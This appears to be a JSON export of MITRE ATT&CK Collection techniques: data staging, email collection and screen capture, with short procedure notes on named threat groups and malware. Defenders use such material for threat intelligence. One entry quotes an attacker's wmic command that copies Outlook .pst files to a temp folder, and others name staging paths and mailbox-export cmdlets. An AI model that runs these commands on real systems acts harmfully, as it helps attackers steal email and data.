                        "Description": "<name> can stage collected information including screen captures and logged keystrokes locally.[23]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.[41]"
                    },
                    "S0249": {
                        "ID": "S0249",
                        "Name": "Gold Dragon",
                        "Description": "<name> stores information gathered from the endpoint in a file named 1.hwp.[42]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> creates folders to store output from batch scripts prior to sending the information to its C2 server.[43]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has stored collected date in a .tmp file.[44]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> determines a working directory where it stores all the gathered data about the compromised machine.[45][46]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> stages command output and collected data in files before exfiltration.[47]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> can save collected system information to a file named \"info\" before exfiltration.[48]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has staged collected data files under C:\\Program Files\\Common Files\\System\\Ole DB\\.[49][50]"
                    },
                    "S1075": {
                        "ID": "S1075",
                        "Name": "KOPILUWAK",
                        "Description": "<name> has piped the results from executed C2 commands to %TEMP%\\result2.dat on the local machine.[51]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.[52][53]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.[54][55]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> can store email data in files and directories specified in its configuration, such as C:\\Windows\\ServiceProfiles\\NetworkService\\appdata\\Local\\Temp\\.[56]"
                    },
                    "S1101": {
                        "ID": "S1101",
                        "Name": "LoFiSe",
                        "Description": "<name> can save files to be evaluated for further exfiltration in the C:\\Programdata\\Microsoft\\ and    C:\\windows\\temp\\ folders. [57]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> stores files and logs in a folder on the local drive.[58][59]"
                    },
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> has stored collected files locally before exfiltration.[60]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can place retrieved files into a destination directory.[61]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can store collected data locally in a created .nfo file.[62]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.[63]"
                    },
                    "S0443": {
                        "ID": "S0443",
                        "Name": "MESSAGETAP",
                        "Description": "<name> stored targeted SMS messages that matched its target list in CSV files on the compromised system.[64]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> has stored the collected system files in a working directory.[61][65]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> has saved files prior to upload from a compromised host to folders beginning with the characters a9850d2f.[66]"
                    },
                    "S0084": {
                        "ID": "S0084",
                        "Name": "Mis-Type",
                        "Description": "<name> has temporarily stored collected information to the files \"%AppData%\\{Unique Identifier}\\HOSTRURKLSR\" and \"%AppData%\\{Unique Identifier}\\NEWERSSEMP\".[67]"
                    },
                    "S0149": {
                        "ID": "S0149",
                        "Name": "MoonWind",
                        "Description": "<name> saves information from its keylogging routine as a .zip file in the present working directory.[68]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has stored a decoy PDF file within a victim's %temp% folder.[69]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has stored collected credential files in c:\\windows\\temp prior to exfiltration. <name> has also stored documents for exfiltration in a hidden folder on USB drives.[70][71]"
                    },
                    "S0247": {
                        "ID": "S0247",
                        "Name": "NavRAT",
                        "Description": "<name> writes multiple outputs to a TMP file using the >> method.[72]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has the ability to write collected data to a file created in the ./LOGS directory.[73]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> has copied captured files and keystrokes to the %TEMP% directory of compromised hosts.[74]"
                    },
                    "S0353": {
                        "ID": "S0353",
                        "Name": "NOKKI",
                        "Description": "<name> can collect data from the victim and stage it in LOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp.[75]"
                    },
                    "S0644": {
                        "ID": "S0644",
                        "Name": "ObliqueRAT",
                        "Description": "<name> can copy specific files, webcam captures, and screenshots to local directories.[76]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> has stored collected information in the Application Data directory on a compromised host.[77][78]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> stages the output from command execution and collected files in specific folders before exfiltration.[79]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, stolen data was copied into a text file using the format From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt prior to compression, encoding, and exfiltration.[80]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors staged archived files in a temporary directory prior to exfiltration.[81]"
                    },
                    "S1109": {
                        "ID": "S1109",
                        "Name": "PACEMAKER",
                        "Description": "<name> has written extracted data to tmp/dsserver-check.statementcounters.[82]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> copied all targeted files to a directory called index that was eventually uploaded to the C&C server.[13]"
                    },
                    "S0012": {
                        "ID": "S0012",
                        "Name": "PoisonIvy",
                        "Description": "<name> stages collected data in a text file.[83]"
                    },
                    "S1012": {
                        "ID": "S1012",
                        "Name": "PowerLess",
                        "Description": "<name> can stage stolen browser data in C:\\\\Windows\\\\Temp\\\\cup.tmp and keylogger data in C:\\\\Windows\\\\Temp\\\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK.[84]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "<name> creates a directory, %USERPROFILE%\\AppData\\Local\\SKC\\, which is used to store collected log files.[85]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> creates various subdirectories under %Temp%\\reports\\% and copies files to those subdirectories. It also creates a folder at C:\\Users\\\\AppData\\Roaming\\Microsoft\\store to store screenshot JPEG files.[86]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> has saved information to a random temp file before exfil.[87]"
                    },
                    "S0197": {
                        "ID": "S0197",
                        "Name": "PUNCHTRACK",
                        "Description": "<name> aggregates collected data in a tmp file.[88]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has stored stolen emails and other data into new folders prior to exfiltration.[89]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use a file exfiltration tool to copy files to C:\\ProgramData\\Adobe\\temp prior to exfiltration.[90]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can stage data prior to exfiltration in %APPDATA%\\Microsoft\\UserSetting and %APPDATA%\\Microsoft\\UserSetting\\MediaCache.[91][92]"
                    },
                    "S0169": {
                        "ID": "S0169",
                        "Name": "RawPOS",
                        "Description": "Data captured by <name> is placed in a temporary file under a directory named \"memdump\".[93]"
                    },
                    "S0090": {
                        "ID": "S0090",
                        "Name": "Rover",
                        "Description": "<name> copies files from removable drives to C:\\system.[94]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has collected stolen files in a temporary folder in preparation for exfiltration.[95]"
                    },
                    "S1110": {
                        "ID": "S1110",
                        "Name": "SLIGHTPULSE",
                        "Description": "<name> has piped the output from executed commands to /tmp/1.[82]"
                    },
                    "S1104": {
                        "ID": "S1104",
                        "Name": "SLOWPULSE",
                        "Description": "<name> can write logged ACE credentials to /home/perl/PAUS.pm in append mode, using the format string %s:%s\\n.[82]"
                    },
                    "S1124": {
                        "ID": "S1124",
                        "Name": "SocGholish",
                        "Description": "<name> can send output from whoami to a local temp file using the naming convention rad<5-hex-chars>.tmp.[96]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> can store harvested data in a custom database under the %TEMP% directory.[97]"
                    },
                    "S0035": {
                        "ID": "S0035",
                        "Name": "SPACESHIP",
                        "Description": "<name> identifies files with certain extensions and copies them to a directory in the user's profile.[39]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> has stored collected data in a file called stari.txt.[98]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "<name> has stored collected data under %<malware_execution_folder>%\\\\CrashLog.txt.[99]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has aggregated collected credentials in text files before exfiltrating.[100]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has locally staged encrypted archives for later exfiltration efforts.[101]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can create directories to store plugin output and stage data for exfiltration.[102][103]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> can store copied files in a specific directory prior to exfiltration.[11]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used tmp files to stage gathered information.[104]"
                    },
                    "S0136": {
                        "ID": "S0136",
                        "Name": "USBStealer",
                        "Description": "<name> collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.[105][106]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has saved stolen files including the ntds.dit database and the SYSTEM and SECURITY Registry hives locally to the C:\\Windows\\Temp\\ directory.[107][108]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has staged ZIP files in local directories such as, C:\\PerfLogs\\1\\ and C:\\User\\1\\ prior to exfiltration.[109]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> stores all collected information in a single file before exfiltration.[110]"
                    }
                }
            },
            "002": {
                "name": "Remote Data Staging",
                "href": "/techniques/T1074/002",
                "description": "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.[1]By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has staged archives of collected data on a target's Outlook Web Access (OWA) server.[2]"
                    },
                    "S1043": {
                        "ID": "S1043",
                        "Name": "ccf32",
                        "Description": "<name> has copied files to a remote machine infected with Chinoxy or another backdoor.[3]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has staged stolen data on designated servers in the target environment.[4]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> actors have compressed data from remote systems and moved it to another staging system before exfiltration.[5]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> aggregates staged data from a network into a single location.[6]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has staged data remotely prior to exfiltration.[7]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has staged data on remote MSP systems or other victim networks prior to exfiltration.[8][9]"
                    },
                    "G1019": {
                        "ID": "G1019",
                        "Name": "MoustachedBouncer",
                        "Description": "<name> has used plugins to save captured screenshots to .\\AActdata\\ on an SMB share.[10]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors copied files to company web servers and subsequently downloaded them.[11]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 staged data and files in password-protected archives on a victim's OWA server.[12]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has moved staged encrypted archives to Internet-facing servers that had previously been compromised with China Chopper prior to exfiltration.[13]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> manually transferred collected files to an exfiltration host using xcopy.[14]"
                    }
                }
            }
        },
        "tactic": "Collection",
        "description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.[1]In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.[2]Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
        "Procedure": {
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can create directories to store logs and other collected data.[3]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware can write captured SSH connection credentials to a file under the /var/run directory with a .pid extension for exfiltration.[4]"
            },
            "S1076": {
                "ID": "S1076",
                "Name": "QUIETCANARY",
                "Description": "malware has the ability to stage data prior to exfiltration.[5]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware stages data in a centralized database prior to exfiltration.[6]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware has stored information in folders named U1 and U2 prior to exfiltration.[7]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has staged collected data in password-protected archives.[8]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules.[9]"
            }
        }
    },
    "T1114": {
        "ttp_name": "Email Collection",
        "ttp_id": "T1114",
        "href": "/techniques/T1114",
        "subtechnique": {
            "001": {
                "name": "Local Email Collection",
                "href": "/techniques/T1114/001",
                "description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.[1] IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in C:\\Users\\<username>\\Documents\\Outlook Files or C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook.[2]",
                "Procedure": {
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files.[3]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.[4]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has harvested data from victim's e-mail including through execution of wmic /node: process call create \"cmd /c copy c:\\Users\\\\\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\\\\\My Documents\\.pst\"copy.[5]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.[6]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> contains a command to collect and exfiltrate emails from Outlook.[7]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed leveraging a module that scrapes email data from Outlook.[8]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> has the ability to collect emails on a target system.[9]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> can harvest data from mail clients.[10]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has collected .PST archives.[11]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used RAT malware to exfiltrate email archives.[12]"
                    },
                    "S0594": {
                        "ID": "S0594",
                        "Name": "Out1",
                        "Description": "<name> can parse e-mails on a target machine.[13]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can interact with a victim\u2019s Outlook session and look through folders and emails.[14]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can target and steal locally stored emails to support thread hijacking phishing campaigns.[15][16][17]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).[18]"
                    }
                }
            },
            "002": {
                "name": "Remote Email Collection",
                "href": "/techniques/T1114/002",
                "description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.",
                "Procedure": {
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.[1]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has collected emails from victim Microsoft Exchange servers.[2][3]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers, including via Exchange Web Services (EWS) API requests.[4][5]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has harvested data from remote mailboxes including through execution of \\\\c$\\Users\\\\AppData\\Local\\Microsoft\\Outlook*.ost.[6]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has accessed email accounts using Outlook Web Access.[7]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has accessed and hijacked online email communications using stolen credentials.[8][9]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used web shells to export mailbox data.[10][11]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes.[12][13]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP.[14]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> used a tool called MailSniper to search through the Exchange server mailboxes for keywords.[15]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> collects Exchange emails matching rules specified in its configuration.[16]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has exported emails from compromised Exchange servers including through use of the cmdlet New-MailboxExportRequest.[17][18]"
                    },
                    "S0413": {
                        "ID": "S0413",
                        "Name": "MailSniper",
                        "Description": "<name> can be used for searching through email in Exchange and Office 365 environments.[19]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "Some <name> samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[20]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest.[21][22]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> can collect sensitive mailing information from Exchange servers, including credentials and the domain certificate of an enterprise.[23]"
                    }
                }
            },
            "003": {
                "name": "Email Forwarding Rule",
                "href": "/techniques/T1114/003",
                "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations.[1] Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.[2] Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.[3][4]Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.[2]In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.[5] Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",
                "Procedure": {
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has set auto-forward rules on victim's e-mail accounts.[6]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has set an Office 365 tenant level mail transport rule to send all mail in and out of the targeted organization to the newly created account.[7]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has set up auto forwarding rules on compromised e-mail accounts.[8]"
                    }
                }
            }
        },
        "tactic": "Collection",
        "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.",
        "Procedure": {
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has been observed leveraging a module that can scrape email addresses from Outlook.[1][2][3]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has compromised email credentials in order to steal sensitive data.[4]"
            },
            "G0122": {
                "ID": "G0122",
                "Name": "Silent Librarian",
                "Description": "malware has exfiltrated entire mailboxes from compromised accounts.[5]"
            }
        }
    },
    "T1113": {
        "ttp_name": "Screen Capture",
        "ttp_id": "T1113",
        "href": "/techniques/T1113",
        "tactic": "Collection",
        "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.[1][2]",
        "Procedure": {
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can capture screenshots of the victim\u2019s desktop.[3][4][5][6][7]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can take screenshots on a compromised host by calling a series of APIs.[8][9]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used tools to take screenshots from victims.[10][11][12][13]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used a screen capture utility to take screenshots on a compromised host.[14][15]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to capture screenshots on compromised hosts.[16]"
            },
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware has the ability to view the screen on compromised hosts.[17]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware's has a plugin that captures screenshots of the target applications.[18]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can capture screenshots of the victim\u2019s machines.[19]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can take screenshots and send them to an actor-controlled C2 server.[20]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "malware has a command to take a screenshot and send it to the C2 server.[21][22]"
            },
            "S0337": {
                "ID": "S0337",
                "Name": "BadPatch",
                "Description": "malware captures screenshots in .jpg format and then exfiltrates them.[23]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware is capable of taking an image of and uploading the current desktop.[24][25]"
            },
            "S0017": {
                "ID": "S0017",
                "Name": "BISCUIT",
                "Description": "malware has a command to periodically take screenshots of the system.[26]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware is capable of taking screenshots.[27]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter.[28]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has used a tool to capture screenshots.[29][30]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can take screenshots on compromised hosts.[31]"
            },
            "S0454": {
                "ID": "S0454",
                "Name": "Cadelspy",
                "Description": "malware has the ability to capture screenshots and webcam photos.[32]"
            },
            "S0351": {
                "ID": "S0351",
                "Name": "Cannon",
                "Description": "malware can take a screenshot of the desktop.[33]"
            },
            "S0030": {
                "ID": "S0030",
                "Name": "Carbanak",
                "Description": "malware performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.[34]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware can capture display screenshots with the screens_dll.dll plugin.[35]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware can capture screenshots.[36]"
            },
            "S0261": {
                "ID": "S0261",
                "Name": "Catchamas",
                "Description": "malware captures screenshots based on specific keywords in the window\u2019s title.[37]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware can capture screenshots of the infected machine.[38]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware has the ability to capture screenshots.[39]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "malware has the capability to capture screenshots.[12]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware has the ability to capture screenshots.[40]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware has the ability to capture screenshots.[41]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware's Beacon payload is capable of capturing screenshots.[42][43][44]"
            },
            "S0338": {
                "ID": "S0338",
                "Name": "Cobian RAT",
                "Description": "malware has a feature to perform screen capture.[45]"
            },
            "S0591": {
                "ID": "S0591",
                "Name": "ConnectWise",
                "Description": "malware can take screenshots on remote hosts.[46]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware takes periodic screenshots and exfiltrates them.[47]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware contains a command to perform screen captures.[48][49][50]"
            },
            "S0235": {
                "ID": "S0235",
                "Name": "CrossRAT",
                "Description": "malware is capable of taking screen captures.[24]"
            },
            "G0070": {
                "ID": "G0070",
                "Name": "Dark Caracal",
                "Description": "malware took screenshots using their Windows malware.[24]"
            },
            "S0187": {
                "ID": "S0187",
                "Name": "Daserf",
                "Description": "malware can take screenshots.[51][29]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware is capable of performing screen captures.[52]"
            },
            "S0213": {
                "ID": "S0213",
                "Name": "DOGCALL",
                "Description": "malware is capable of capturing screenshots of the victim's machine.[53][54]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).[55][56][57]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware captures PNG screenshots of the main screen.[58]"
            },
            "S0593": {
                "ID": "S0593",
                "Name": "ECCENTRICBANDWAGON",
                "Description": "malware can capture screenshots and store them locally.[59]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
